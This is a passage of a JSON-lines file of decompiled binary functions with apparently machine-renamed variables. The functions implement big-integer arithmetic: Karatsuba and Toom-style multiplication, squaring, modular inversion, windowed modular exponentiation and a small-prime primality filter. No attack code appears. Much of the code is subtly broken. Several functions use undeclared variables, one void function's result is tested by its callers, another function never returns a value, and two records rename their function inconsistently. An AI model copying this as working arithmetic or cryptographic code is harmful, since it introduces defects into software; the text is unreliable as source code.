FUN_004064f0(local_48); \n    FUN_004064f0(&intermediateResult1); \n    return returnValue; \n}"}
{"Function Name": "FUN_0040c130", "Address": "0040c130", "Source Code": "ulong FUN_0040c130(undefined8 param_1,int *param_2,int *param_3)\n{\n    uint returnValue; \n    ulong finalReturnValue; \n    long loopCounter; \n    int *unusedPointer1; \n    int *unusedPointer2; \n    int localArray1 [4]; \n    int localArray2 [4]; \n    int localArray3 [4]; \n    int localArray4 [2]; \n    int singleInteger1; \n    undefined4 unusedVariable; \n    undefined8 *pointerToArray; \n    int localArray5 [4]; \n    int singleInteger2; \n    int singleInteger3; \n    int singleInteger4; \n    int singleInteger5; \n    int singleInteger6; \n    initializedValue = 0; \n    \n    if ((param_2[2] == 1) || (*param_2 == 0)) {\n        return 0xfffffffd; \n    }\n    \n    finalReturnValue = FUN_00406b50(localArray1, localArray2, localArray3, localArray4, &singleInteger1, localArray5, &singleInteger2, &singleInteger5, 0);\n    if ((int)finalReturnValue != 0) {\n        return finalReturnValue; \n    }\n    \n    returnValue = FUN_0040b8d0(param_1, param_2, localArray1);\n    if (returnValue == 0) {\n        \n        returnValue = FUN_00406750(param_2, localArray2);\n        if ((returnValue == 0) && (((localArray1[0] < 1 || ((*local_118 & 1) != 0)) || (localArray2[0] < 1)) || ((*condition3 & 1) != 0))) {\n            \n            returnValue = FUN_00406750(localArray1, localArray3);\n            if (returnValue == 0) {\n                \n                returnValue = FUN_00406750(localArray2, localArray4);\n                if (returnValue == 0) {\n                    loopCounter = 0; \n                    unusedVariable = 0; \n                    \n                    if (0 < arraySize1) {\n                        do {\n                            pointerToArray[loopCounter] = 0; \n                            loopCounter++; \n                        } while ((int)loopCounter < arraySize1); \n                    }\n                    loopCounter = 0; \n                    *pointerToArray = 1; \n                    singleInteger1 = 1; \n                    \n                    if (0 < singleInteger3) {\n                        do {\n                            array1[loopCounter] = 0; \n                            loopCounter++; \n                        } while ((int)loopCounter < singleInteger3); \n                    }\n                    *array1 = 1; \n                    singleInteger5 = 1; \n                    \n                    do {\n                        \n                        while ((0 < localArray3[0] && ((*condition1 & 1) == 0))) {\n                            returnValue = FUN_00406860(localArray3); \n                            \n                            if (((returnValue != 0) || ((((0 < singleInteger1 && ((*(byte *)pointerToArray & 1) != 0)) || ((0 < localArray5[0] && ((*condition2 & 1) != 0)))) && ((returnValue = FUN_0040a6e0(&singleInteger1, localArray2), returnValue != 0 || (returnValue = FUN_0040b100(localArray5, localArray1), returnValue != 0)))) || (returnValue = FUN_00406860(&singleInteger1), returnValue != 0))) || (returnValue = FUN_00406860(localArray5), returnValue != 0)) goto LAB_0040c59e; \n                        }\n                        \n                        while ((0 < localArray4[0] && ((*condition4 & 1) == 0))) {\n                            returnValue = FUN_00406860(localArray4); \n                            \n                            if ((returnValue != 0) || (((0 < singleInteger2 && ((*local_58 & 1) != 0)) || ((0 < singleInteger5 && ((*(byte *)array1 & 1) != 0)))) && ((returnValue = FUN_0040a6e0(&singleInteger2, localArray2, &singleInteger2), returnValue != 0 || (returnValue = FUN_0040b100(&singleInteger5, localArray1, &singleInteger5), returnValue != 0)))))) goto LAB_0040c59e; \n                        }\n                        \n                        comparisonResult = FUN_00406680(localArray3, localArray4);\n                        if (comparisonResult == -1) {\n                            \n                            returnValue = FUN_0040b100(localArray4, localArray3); \n                            if ((returnValue != 0) || (returnValue = FUN_0040b100(&singleInteger2, &singleInteger1, &singleInteger2), returnValue != 0)) goto LAB_0040c59e; \n                            returnValue = FUN_0040b100(&singleInteger5, localArray5, &singleInteger5); \n                        } else {\n                            \n                            returnValue = FUN_0040b100(localArray3, localArray4); \n                            if ((returnValue != 0) || (returnValue = FUN_0040b100(&singleInteger1, &singleInteger2), returnValue != 0)) goto LAB_0040c59e; \n                            returnValue = FUN_0040b100(localArray5, &singleInteger5); \n                        }\n                        if (returnValue != 0) goto LAB_0040c59e; \n                        \n                        if (localArray3[0] == 0) {\n                            \n                            if (((singleInteger6 != 1) && (localArray4[0] < 2)) && (comparisonResult = FUN_00405a00(localArray4, 1), comparisonResult == 0)) goto LAB_0040c631; \n                            finalReturnValue = 0xfffffffd; \n                            break; \n                        }\n                    } while (true); \n                }\n            }\n        }\n    }\nLAB_0040c59e: \n    finalReturnValue = (ulong)returnValue; \nLAB_0040c1d7: \n    FUN_00406540(localArray1, localArray2, localArray3, localArray4, &singleInteger1, localArray5, &singleInteger2, &singleInteger5, 0); \n    return finalReturnValue; \n}"}
{"Function Name": "FUN_0040c6c0", "Address": "0040c6c0", "Source Code": "undefined8 FUN_0040c6c0(undefined8 input_value, int *array_pointer)\n{\n    \n    if ((array_pointer[2] == 1) || (*array_pointer == 0)) {\n        \n        return 0xfffffffd;\n    }\n    \n    if ((0 < *array_pointer) && ((**(byte **)(array_pointer + 4) & 1) != 0)) {\n        \n        return FUN_0040bdc0();\n    }\n    \n    return FUN_0040c130();\n}"}
{"Function Name": "FUN_0040c760", "Address": "0040c760", "Source Code": "undefined8 FUN_0040c760(int *param_1, int *param_2, undefined8 param_3) {\n    int tempVar1, tempVar3, tempVar4, minValue; \n    long loopIndex, param1Offset, param2Offset; \n    undefined8 returnValue; \n    int tempArray1[2]; \n    long localStorage1, localStorage2; \n    int tempArray2[4], tempArray3[2]; \n    undefined undefinedArray1[32], undefinedArray2[32], undefinedArray3[40]; \n    returnValue = 0xfffffffe; \n    minValue = *param_2 < *param_1 ? *param_2 : *param_1; \n    minValue >>= 1; \n    \n    if (FUN_00406ce0(tempArray1, minValue) == 0 &&\n        FUN_00406ce0(tempArray2, *param_1 - minValue) == 0 &&\n        FUN_00406ce0(tempArray3, minValue) == 0 &&\n        FUN_00406ce0(tempArray4, *param_2 - minValue) == 0) {\n        \n        tempVar3 = minValue * 2; \n        \n        if (FUN_00406ce0(undefinedArray1, tempVar3) == 0 &&\n            FUN_00406ce0(undefinedArray2, tempVar3) == 0 &&\n            FUN_00406ce0(undefinedArray3, tempVar3) == 0) {\n            \n            tempVar4 = *param_1; \n            tempVar1 = *param_2; \n            long *longPointer; \n            tempArray2[0] = tempVar4 - minValue; \n            tempArray4[0] = tempVar1 - minValue; \n            if (minValue > 0) { \n                for (loopIndex = 0; loopIndex < minValue; loopIndex++) { \n                    *(undefined8 *)(localStorage1 + loopIndex * 8) = *(undefined8 *)(param_1 + 4 + loopIndex * 8); \n                    *(undefined8 *)(localStorage2 + loopIndex * 8) = *(undefined8 *)(param_2 + 4 + loopIndex * 8); \n                }\n                loopIndex = (ulong)(minValue - 1) * 8 + 8; \n                param1Offset = *(long *)(param_1 + 4) + loopIndex; \n                param2Offset = *(long *)(param_2 + 4) + loopIndex; \n            }\n            if (minValue < tempVar4) { \n                for (loopIndex = 0; loopIndex < (ulong)((tempVar4 - minValue) * 8); loopIndex += 8) { \n                    *(undefined8 *)(localStorage3 + loopIndex) = *(undefined8 *)(param1Offset + loopIndex); \n                }\n            }\n            if (minValue < tempVar1) { \n                for (loopIndex = 0; loopIndex < (ulong)((tempVar1 - minValue) * 8); loopIndex += 8) { \n                    *(undefined8 *)(localStorage4 + loopIndex) = *(undefined8 *)(param2Offset + loopIndex); \n                }\n            }\n            tempArray1[0] = minValue; \n            if (minValue > 0) { \n                param1Offset = *(long *)(localStorage1 + -8 + (long)minValue * 8); \n                longPointer = (long *)(localStorage1 + -0x10 + (long)minValue * 8); \n                while (param1Offset == 0) { \n                    tempArray1[0]--; \n                    if (tempArray1[0] == 0) { \n                        tempArray1[0] = 0; \n                        break; \n                    }\n                    param1Offset = *longPointer--; \n                }\n            }\n            tempArray3[0] = minValue; \n            if (minValue > 0) { \n                param1Offset = *(long *)(localStorage2 + -8 + (long)minValue * 8); \n                longPointer = (long *)(localStorage2 + -0x10 + (long)minValue * 8); \n                while (param1Offset == 0) { \n                    tempArray3[0]--; \n                    if (tempArray3[0] == 0) { \n                        tempArray3[0] = 0; \n                        break; \n                    }\n                    param1Offset = *longPointer--; \n                }\n            }\n            \n            if (FUN_0040cb50(tempArray1, tempArray3, undefinedArray2) == 0 &&\n                FUN_0040cb50(tempArray2, tempArray4, undefinedArray3) == 0 &&\n                FUN_00409900(tempArray2, tempArray1, undefinedArray1) == 0 &&\n                FUN_00409900(tempArray4, tempArray3, tempArray1) == 0 &&\n                FUN_0040cb50(undefinedArray1, tempArray1) == 0 &&\n                FUN_0040a6e0(undefinedArray2, undefinedArray3, tempArray1) == 0 &&\n                FUN_0040a1c0(undefinedArray1, tempArray1) == 0 &&\n                FUN_00407140(undefinedArray1, minValue) == 0 &&\n                FUN_00407140(undefinedArray3, tempVar3) == 0 &&\n                FUN_0040a6e0(undefinedArray2, undefinedArray1) == 0 &&\n                FUN_0040a6e0(undefinedArray1, undefinedArray3, param_3) == 0) {\n                returnValue = 0; \n            }\n            FUN_004064f0(undefinedArray3); \n        }\n        FUN_004064f0(undefinedArray2); \n    }\n    FUN_004064f0(undefinedArray1); \n    FUN_004064f0(tempArray4); \n    FUN_004064f0(tempArray3); \n    FUN_004064f0(tempArray2); \n    FUN_004064f0(tempArray1); \n    return returnValue; \n}"}
{"Function Name": "FUN_0040cb50", "Address": "0040cb50", "Source Code": "void FUN_0040cb50(int *inputArray1, int *inputArray2, int *outputArray)\n{\n    \n    int thirdElementInput2 = inputArray2[2];\n    int thirdElementInput1 = inputArray1[2];\n    \n    int firstElementInput2 = *inputArray2;\n    int firstElementInput1 = *inputArray1;\n    \n    int minValue = (firstElementInput1 <= firstElementInput2) ? firstElementInput1 : firstElementInput2;\n    \n    if (minValue < DAT_00649584) {\n        \n        if (minValue < DAT_0064958c) {\n            \n            if ((firstElementInput2 + 1 + firstElementInput1 < 0x200) && (minValue < 0x101)) {\n                \n                FUN_00405cb0(inputArray1, inputArray2, outputArray);\n            } else {\n                \n                FUN_00409ac0();\n            }\n        } else {\n            \n            FUN_0040c760(inputArray1, inputArray2, outputArray);\n        }\n    } else {\n        \n        FUN_0040cbf0(inputArray1, inputArray2, outputArray);\n    }\n    \n    outputArray[2] = (0 < *outputArray) ? (uint)(thirdElementInput1 != thirdElementInput2) : 0;\n    \n    return;\n}"}
{"Function Name": "FUN_0040cbf0", "Address": "0040cbf0", "Source Code": "ulong FUN_0040cbf0(int *param_1, int *param_2, undefined8 param_3)\n{\n    int minValue; \n    int doubleValue; \n    uint resultCode; \n    ulong functionResult; \n    undefined buffer1 [32]; \n    undefined buffer2 [32]; \n    undefined buffer3 [32]; \n    undefined buffer4 [32]; \n    undefined buffer5 [32]; \n    undefined buffer6 [32]; \n    undefined buffer7 [32]; \n    undefined buffer8 [32]; \n    undefined buffer9 [32]; \n    undefined buffer10 [32]; \n    undefined buffer11 [40]; \n    \n    \n    functionResult = FUN_00406b50(buffer1, buffer2, buffer3, buffer4, buffer5, buffer6, buffer7, buffer8,\n                         buffer9, buffer10, buffer11, 0);\n    \n    \n    if ((int)functionResult == 0) {\n        minValue = *param_2; \n        \n        if (*param_1 <= minValue) {\n            minValue = *param_1; \n        }\n        minValue = minValue / 3; \n        doubleValue = minValue * 2; \n        uint scaledValue = minValue * 0x3c; \n        \n        if (FUN_004071f0(param_1, scaledValue, buffer6) == 0 &&\n            FUN_00406750(param_1, buffer7) == 0) {\n            FUN_00407e40(buffer7, minValue); \n            if (FUN_004071f0(buffer7, scaledValue, buffer7) == 0 &&\n                FUN_00406750(param_2, buffer8) == 0) {\n                FUN_00407e40(buffer8, doubleValue); \n                if (FUN_004071f0(param_2, scaledValue, buffer9) == 0 &&\n                    FUN_00406750(param_2, buffer10) == 0) {\n                    FUN_00407e40(buffer10, minValue); \n                    FUN_004071f0(buffer10, scaledValue, buffer10); \n                    if (FUN_00406750(param_2, buffer11) == 0) {\n                        FUN_00407e40(buffer11, doubleValue); \n                        \n                        if (FUN_0040cb50(buffer6, buffer9, buffer1) == 0 &&\n                            FUN_0040cb50(buffer8, buffer11, buffer5) == 0 &&\n                            FUN_00407400(buffer6, local_138) == 0 &&\n                            FUN_0040a6e0(local_138, buffer7, local_138) == 0 &&\n                            FUN_00407400(local_138, local_138) == 0 &&\n                            FUN_0040a6e0(local_138, buffer8, local_138) == 0 &&\n                            FUN_00407400(buffer9, local_118) == 0 &&\n                            FUN_0040a6e0(local_118, buffer10, local_118) == 0 &&\n                            FUN_00407400(local_118, local_118) == 0 &&\n                            FUN_0040a6e0(local_118, buffer11, local_118) == 0 &&\n                            FUN_0040cb50(local_138, local_118, buffer2) == 0 &&\n                            FUN_00407400(buffer8, local_138) == 0 &&\n                            FUN_0040a6e0(local_138, buffer7, local_138) == 0 &&\n                            FUN_00407400(local_138, local_138) == 0 &&\n                            FUN_0040a6e0(local_138, buffer6, local_138) == 0 &&\n                            FUN_00407400(buffer11, local_118) == 0 &&\n                            FUN_0040a6e0(local_118, buffer10, local_118) == 0 &&\n                            FUN_00407400(local_118, local_118) == 0 &&\n                            FUN_0040a6e0(local_118, buffer9, local_118) == 0 &&\n                            FUN_0040cb50(local_138, local_118, buffer4) == 0 &&\n                            FUN_0040a6e0(buffer8, buffer7, local_138) == 0 &&\n                            FUN_0040a6e0(local_138, buffer6, local_138) == 0 &&\n                            FUN_0040a6e0(buffer11, buffer10, local_118) == 0 &&\n                            FUN_0040a6e0(local_118, buffer9, local_118) == 0 &&\n                            FUN_0040cb50(local_138, local_118, buffer3) == 0 &&\n                            FUN_0040b100(buffer2, buffer5) == 0 &&\n                            FUN_0040b100(buffer4, buffer1) == 0 &&\n                            FUN_00406860(buffer2) == 0 &&\n                            FUN_00406860(buffer4) == 0 &&\n                            FUN_0040b100(buffer3, buffer1) == 0 &&\n                            FUN_0040b100(buffer3, buffer5) == 0 &&\n                            FUN_0040b100(buffer2, buffer3) == 0 &&\n                            FUN_0040b100(buffer4, buffer3) == 0 &&\n                            FUN_004074e0(buffer1, 3, local_138) == 0 &&\n                            FUN_0040b100(buffer2, local_138) == 0 &&\n                            FUN_004074e0(buffer5, 3, local_138) == 0 &&\n                            FUN_0040b100(buffer4, local_138) == 0 &&\n                            FUN_004078b0(buffer3, 3) == 0 &&\n                            FUN_0040b100(buffer3, buffer2) == 0 &&\n                            FUN_0040b100(buffer3, buffer4) == 0 &&\n                            FUN_0040b100(buffer2, buffer3) == 0 &&\n                            FUN_0040b100(buffer4, buffer3) == 0 &&\n                            FUN_00406d50(buffer2, buffer2, 0) == 0 &&\n                            FUN_00406d50(buffer4, buffer4, 0) == 0 &&\n                            FUN_00407140(buffer2, minValue) == 0 &&\n                            FUN_00407140(buffer3, doubleValue) == 0 &&\n                            FUN_00407140(buffer4, minValue * 3) == 0 &&\n                            FUN_00407140(buffer5, minValue << 2) == 0 &&\n                            FUN_0040a6e0(buffer1, buffer2, param_3) == 0 &&\n                            FUN_0040a6e0(buffer3, buffer4, local_138) == 0 &&\n                            FUN_0040a6e0(buffer5, local_138, local_138) == 0 &&\n                            FUN_0040a6e0(local_138, param_3, param_3) == 0) {\n                                resultCode = 0; \n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}"}
{"Function Name": "FUN_0040dcb0", "Address": "0040dcb0", "Source Code": "undefined8 FUN_0040dcb0(int *param_1, undefined8 param_2)\n{\n    long *previousLongPointer; \n    long loopIndex; \n    long nextLongValue; \n    int halfValue; \n    undefined8 returnValue; \n    int localArrayE8[2]; \n    int localArrayC8[4]; \n    long localDataStorage; \n    returnValue = 0xfffffffe; \n    halfValue = *param_1 >> 1; \n    \n    if (FUN_00406ce0(localArrayE8, halfValue) == 0 &&\n        FUN_00406ce0(localArrayC8, *param_1 - halfValue) == 0 &&\n        FUN_00406ce0(localDataStorage, *param_1 * 2) == 0 &&\n        FUN_00406ce0(localDataStorage, *param_1 * 2) == 0 &&\n        FUN_00406ce0(localDataStorage, halfValue * 2) == 0 &&\n        FUN_00406ce0(localDataStorage, (*param_1 - halfValue) * 2) == 0) \n    {\n        nextLongValue = *(long *)(param_1 + 4); \n        if (0 < halfValue) { \n            loopIndex = 0; \n            do {\n                *(undefined8 *)(localDataStorage + loopIndex * 8) = *(undefined8 *)(nextLongValue + loopIndex * 8); \n                loopIndex++; \n            } while ((int)loopIndex < halfValue); \n            nextLongValue = nextLongValue + 8 + (ulong)(halfValue - 1) * 8; \n        }\n        localArrayC8[0] = *param_1; \n        if (halfValue < localArrayC8[0]) { \n            loopIndex = 0; \n            do {\n                *(undefined8 *)(localDataStorage + loopIndex) = *(undefined8 *)(nextLongValue + loopIndex); \n                loopIndex += 8; \n            } while (loopIndex != (ulong)(uint)((localArrayC8[0] + -1) - halfValue) * 8 + 8); \n        }\n        localArrayC8[0] -= halfValue; \n        localArrayE8[0] = halfValue; \n        if (halfValue < 1) { \n            if (halfValue == 0) { \n                localArrayE8[0] = 0; \n            }\n        } else { \n            nextLongValue = *(long *)(localDataStorage + -8 + (long)halfValue * 8); \n            previousLongPointer = (long *)(localDataStorage + -0x10 + (long)halfValue * 8); \n            while (nextLongValue == 0) { \n                localArrayE8[0]--; \n                if (localArrayE8[0] == 0) { \n                    localArrayE8[0] = 0; \n                    break; \n                }\n                nextLongValue = *previousLongPointer; \n                previousLongPointer--; \n            }\n        }\n        \n        if (FUN_0040df80(localArrayE8, localDataStorage) == 0 &&\n            FUN_0040df80(localArrayC8, localDataStorage) == 0 &&\n            FUN_00409900(localArrayC8, localArrayE8, localDataStorage) == 0 &&\n            FUN_0040df80(localDataStorage) == 0 &&\n            FUN_00409900(localDataStorage, localDataStorage, localDataStorage) == 0 &&\n            FUN_0040a1c0(localDataStorage, localDataStorage) == 0 &&\n            FUN_00407140(localDataStorage, halfValue) == 0 &&\n            FUN_00407140(localDataStorage, halfValue * 2) == 0 &&\n            FUN_0040a6e0(localDataStorage, localDataStorage) == 0 &&\n            FUN_0040a6e0(localDataStorage, localDataStorage, param_2) == 0) \n        {\n            returnValue = 0; \n        }\n    }\n    FUN_004064f0(localDataStorage); \n    return returnValue; \n}"}
{"Function Name": "FUN_0040df80", "Address": "0040df80", "Source Code": "void FUN_0040df80(int *input_pointer,long offset)\n{\n    int value = *input_pointer; \n    if (threshold_one <= value) { \n        FUN_0040dff0(); \n    } else if (value < threshold_two) { \n        if (value * 2 < 0x1ff && value < 0x80) { \n            FUN_00406130(); \n        } else {\n            FUN_00409f20(); \n        }\n    } else {\n        FUN_0040dcb0(); \n    }\n    *(undefined4 *)(offset + 8) = 0; \n}"}
{"Function Name": "FUN_0040e740", "Address": "0040e740", "Source Code": "void executeFunction(void) \n{\n    callAnotherFunction(); \n}"}
{"Function Name": "FUN_0040e9d0", "Address": "0040e9d0", "Source Code": "void executeFunction(void) \n{\n    helperFunction(); \n}"}
{"Function Name": "FUN_0040e9e0", "Address": "0040e9e0", "Source Code": "ulong FUN_0040e9e0(undefined8 param_1, int *param_2, int *param_3, undefined4 *param_4, int param_5)\n{\n    uint intermediateResult; \n    ulong finalResult; \n    undefined8 valueAccumulator; \n    int loopCounter4; \n    int calculationValue; \n    int stateDeterminer; \n    uint bitManipulationValue1; \n    uint bitManipulationValue2; \n    uint functionReturnValue; \n    undefined4 *arrayPointer1; \n    undefined4 *arrayPointer2; \n    byte unusedVariable = 0; \n    stateDeterminer = 2; \n    loopCounter4 = *param_2; \n    if (loopCounter4 != 0) { \n        calculationValue = (loopCounter4 - 1) * 0x3c; \n        for (finalResult = *(ulong *)(*(long *)(param_2 + 4) + -8 + (long)loopCounter4 * 8); finalResult != 0; finalResult >>= 1) {\n            calculationValue++; \n        }\n        if (calculationValue < 8) { \n            stateDeterminer = 2;\n        } else {\n            stateDeterminer = 3;\n            if ((((0x24 < calculationValue) && (stateDeterminer = 4, 0x8c < calculationValue)) && (stateDeterminer = 5, 0x1c2 < calculationValue)) &&\n                (stateDeterminer = 6, 0x517 < calculationValue)) {\n                stateDeterminer = (0xdc9 < calculationValue) + 7; \n            }\n        }\n    }\n    finalResult = FUN_00406af0(local_1820); \n    if ((int)finalResult != 0) { \n        return finalResult; \n    }\n    bitManipulationValue2 = 1 << ((byte)(stateDeterminer - 1) & 0x1f); \n    bitManipulationValue1 = 1 << (sbyte)stateDeterminer; \n    if ((int)bitManipulationValue2 < (int)bitManipulationValue1) { \n        arrayPointer1 = auStack_1838 + (long)(int)bitManipulationValue2 * 6; \n        functionReturnValue = bitManipulationValue2; \n        do {\n            intermediateResult = FUN_00406af0(arrayPointer1); \n            if (intermediateResult != 0) { \n                if ((int)bitManipulationValue2 < (int)functionReturnValue) { \n                    arrayPointer1 = auStack_1838 + (long)(int)bitManipulationValue2 * 6; \n                    do {\n                        arrayPointer2 = arrayPointer1 + 6; \n                        FUN_004064f0(arrayPointer1); \n                        arrayPointer1 = arrayPointer2; \n                    } while (arrayPointer2 != local_1820 + ((long)(int)bitManipulationValue2 + (ulong)(~bitManipulationValue2 + functionReturnValue)) * 6);\n                }\n                FUN_004064f0(local_1820); \n                return (ulong)intermediateResult; \n            }\n            functionReturnValue++; \n            arrayPointer1 += 6; \n        } while (functionReturnValue != bitManipulationValue1); \n    }\n    if (param_5 == 0) { \n        functionReturnValue = FUN_00407370(param_3, &calculationResult); \n        finalResult = (ulong)functionReturnValue; \n        if (functionReturnValue != 0) goto LAB_0040ebe0; \n        code *functionPointer = FUN_0040ac70; \n        if ((*param_3 * 2 < 0x1ff) && (functionPointer = FUN_0040a340, 0xff < *param_3)) {\n            functionPointer = FUN_0040ac70; \n        }\n        functionReturnValue = FUN_00406af0(&localValue1); \n        finalResult = (ulong)functionReturnValue; \n        if (functionReturnValue != 0) goto LAB_0040ebe0; \n        functionReturnValue = FUN_0040ab60(&localValue1, param_3); \n        finalResult = (ulong)functionReturnValue; \n        if (functionReturnValue != 0) goto LAB_0040ed88; \n        functionReturnValue = FUN_0040d9c0(param_1, &localValue1, param_3, local_1820); \n    } else {\n        if (param_5 == 1) { \n            functionPointer = FUN_0040a760; \n            calculationResult = 0x1000000000000000 - **(long **)(param_3 + 4); \n        } else {\n            functionReturnValue = FUN_0040afb0(param_3, &calculationResult); \n            finalResult = (ulong)functionReturnValue; \n            if (functionReturnValue != 0) goto LAB_0040ebe0; \n            functionPointer = FUN_0040aec0; \n        }\n        functionReturnValue = FUN_00406af0(&localValue1); \n        finalResult = (ulong)functionReturnValue; \n        if (functionReturnValue != 0) goto LAB_0040ebe0; \n        long loopCounter3 = 0; \n        localArray1[0] = 0; \n        if (0 < local_1854) { \n            do {\n                localArray2[loopCounter3] = 0; \n                loopCounter3++; \n            } while ((int)loopCounter3 < local_1854); \n        }\n        *localArray2 = 1; \n        localValue1 = 1; \n        functionReturnValue = FUN_0040b8d0(param_1, param_3, local_1820); \n    }\n    finalResult = (ulong)functionReturnValue; \n    if (functionReturnValue == 0) { \n        arrayPointer1 = auStack_1838 + (long)(int)bitManipulationValue2 * 6; \n        functionReturnValue = FUN_00406750(local_1820, arrayPointer1); \n        finalResult = (ulong)functionReturnValue; \n        if (functionReturnValue == 0) { \n            int loopCounter4 = 0; \n            do {\n                functionReturnValue = FUN_0040df80(arrayPointer1, arrayPointer1); \n                if ((functionReturnValue != 0) || (functionReturnValue = (*functionPointer)(arrayPointer1, param_3, calculationResult), functionReturnValue != 0)) {\n                    finalResult = (ulong)functionReturnValue; \n                    goto LAB_0040ed88; \n                }\n                loopCounter4++; \n            } while (loopCounter4 < stateDeterminer - 1); \n            loopCounter4 = bitManipulationValue2 + 1; \n            if (loopCounter4 < (int)bitManipulationValue1) { \n                arrayPointer1 = localArray1 + (long)loopCounter4 * 6; \n                do {\n                    arrayPointer2 = arrayPointer1 + 6; \n                    functionReturnValue = FUN_0040cb50(arrayPointer1, local_1820, arrayPointer2); \n                    if ((functionReturnValue != 0) || (functionReturnValue = (*functionPointer)(arrayPointer2, param_3, calculationResult), functionReturnValue != 0)) {\n                        finalResult = (ulong)functionReturnValue; \n                        goto LAB_0040ed88; \n                    }\n                    arrayPointer1 = arrayPointer2; \n                } while (auStack_1838 + ((long)loopCounter4 + (ulong)((bitManipulationValue1 - 2) - bitManipulationValue2)) * 6 != arrayPointer2); \n            }\n            finalResult = 0; \n            loopCounter4 = 0; \n            int loopCounter1 = 1; \n            int loopCounter2 = 0; \n            long loopValue = 0; \n            int param2Adjusted = *param_2 - 1; \n            valueAccumulator = 0; \n            while (true) { \n                do {\n                    while (true) { \n                        while (true) { \n                            loopCounter1--; \n                            functionReturnValue = (uint)valueAccumulator; \n                            if (loopCounter1 == 0) { \n                                if (param2Adjusted == -1) { \n                                    if ((loopCounter4 < 1) || (functionReturnValue != 2)) goto LAB_0040f023; \n                                    stateDeterminer = 0; \n                                    goto LAB_0040f07e; \n                                }\n                                long loopCounter3 = (long)param2Adjusted; \n                                param2Adjusted--; \n                                loopCounter1 = 0x3c; \n                                loopValue = *(long *)(*(long *)(param_2 + 4) + loopCounter3 * 8); \n                            }\n                            loopValue <<= 1; \n                            intermediateResult = (uint)((ulong)loopValue >> 0x3b) & 1; \n                            if ((intermediateResult | functionReturnValue) != 0) break; \n                            valueAccumulator = 0; \n                        }\n                        if ((intermediateResult != 0) || (functionReturnValue != 1)) break; \n                        functionReturnValue = FUN_0040df80(local_1888, local_1888); \n                        if (functionReturnValue != 0) goto LAB_0040ef7f; \n                        valueAccumulator = (*functionPointer)(local_1888, param_3, calculationResult); \n                        functionReturnValue = (uint)valueAccumulator; \n                        if (functionReturnValue != 0) goto LAB_0040ef7f; \n                        valueAccumulator = CONCAT71((int7)((ulong)valueAccumulator >> 8), 1); \n                    }\n                    loopCounter4++; \n                    valueAccumulator = 2; \n                    loopCounter2 |= intermediateResult << ((sbyte)stateDeterminer - (char)loopCounter4 & 0x1fU); \n                } while (loopCounter4 != stateDeterminer); \n                loopCounter4 = 0; \n                do {\n                    functionReturnValue = FUN_0040df80(local_1888, local_1888); \n                    if ((functionReturnValue != 0) || (functionReturnValue = (*functionPointer)(local_1888, param_3, calculationResult), functionReturnValue != 0))\n                        goto LAB_0040ef7f; \n                    loopCounter4++; \n                } while (loopCounter4 < stateDeterminer); \n                functionReturnValue = FUN_0040cb50(local_1888, auStack_1838 + (long)(int)loopCounter2 * 6, local_1888); \n                if (functionReturnValue != 0) break; \n                valueAccumulator = (*functionPointer)(local_1888, param_3, calculationResult); \n                functionReturnValue = (uint)valueAccumulator; \n                if (functionReturnValue != 0) break; \n                valueAccumulator = CONCAT71((int7)((ulong)valueAccumulator >> 8), 1); \n                loopCounter4 = 0; \n                loopCounter2 = 0; \n            }\n        LAB_0040ef7f: \n            finalResult = (ulong)functionReturnValue; \n        }\n    }\nLAB_0040ed88: \n    FUN_004064f0(&localValue1); \nLAB_0040ebe0: \n    FUN_004064f0(local_1820); \n    if ((int)bitManipulationValue2 < (int)bitManipulationValue1) { \n        arrayPointer1 = auStack_1838 + (long)(int)bitManipulationValue2 * 6; \n        do {\n            arrayPointer2 = arrayPointer1 + 6; \n            FUN_004064f0(arrayPointer1); \n            arrayPointer1 = arrayPointer2; \n        } while (arrayPointer2 != local_1820 + ((long)(int)bitManipulationValue2 + (ulong)((bitManipulationValue1 - 1) - bitManipulationValue2)) * 6); \n    }\n    return finalResult; \n}"}
{"Function Name": "FUN_0040f120", "Address": "0040f120", "Source Code": "ulong FUN_0040f120(int *inputArray, uint *outputValue)\n{\n    uint tempResult; \n    ulong finalResult; \n    long longValue; \n    undefined dataBuffer[32]; \n    *outputValue = 0; \n    \n    if (inputArray[2] == 1) {\n        return 0xfffffffd; \n    }\n    \n    if ((*inputArray != 0) && ((&DAT_0043ee80)[(uint)**(undefined8 **)(inputArray + 4) & 0x7f] != '\\x01')) {\n        \n        finalResult = FUN_00408170(inputArray, 0x69, 0, &longValue);\n        \n        if ((int)finalResult != 0) {\n            return finalResult; \n        }\n        \n        if ((&DAT_0043ee00)[longValue] != '\\x01') {\n            \n            finalResult = FUN_00408960(dataBuffer, 0x38ece7e1);\n            \n            if ((int)finalResult != 0) {\n                return finalResult; \n            }\n            \n            tempResult = FUN_0040b8d0(inputArray, dataBuffer);\n            \n            if (tempResult == 0 && (0x5c4UL >> (FUN_00406a30(dataBuffer) % 0xb) & 1) == 0) {\n                \n                if ((((uint)(0x9e4L >> (FUN_00406a30(dataBuffer) % 0xd)) | \n                    (uint)(0x5ce8L >> (FUN_00406a30(dataBuffer) % 0x11))) & 1) == 0) &&\n                    ((((uint)(0x4f50cL >> (FUN_00406a30(dataBuffer) % 0x13)) | \n                    (uint)(0x7acca0L >> (FUN_00406a30(dataBuffer) % 0x17))) & 1) == 0 &&\n                    (((byte)(0xc2edd0cL >> (FUN_00406a30(dataBuffer) % 0x1d)) | \n                    (byte)(0x6de2b848L >> (FUN_00406a30(dataBuffer) % 0x1f))) & 1) == 0))) {\n                    \n                    tempResult = FUN_0040bc30(inputArray, dataBuffer);\n                    \n                    if (tempResult == 0) {\n                        \n                        tempResult = FUN_0040df80(dataBuffer);\n                        \n                        if (tempResult == 0) {\n                            \n                            *outputValue = (uint)(FUN_004065f0(dataBuffer, inputArray) == 0);\n                        }\n                    }\n                }\n            }\n            finalResult = (ulong)tempResult; \n        }\n    }\n    FUN_004064f0(dataBuffer); \n    return finalResult; \n}"}
{"Function Name": "FUN_0040f370", "Address": "0040f370", "Source Code": "ulong FUN_0040f370(undefined8 input1, undefined8 input2, undefined8 input3)\n{\n    uint result; \n    undefined tempBuffer[32]; \n    \n    \n    if (FUN_00406af0(tempBuffer) != 0) {\n        \n        return FUN_00406af0(tempBuffer);\n    }\n    \n    \n    result = FUN_0040df80(input1, tempBuffer);\n    \n    \n    if (result == 0) {\n        result = FUN_0040b8d0(tempBuffer, input2, input3);\n    }\n    \n    \n    FUN_004064f0(tempBuffer);\n    \n    \n    return (ulong)result;\n}"}
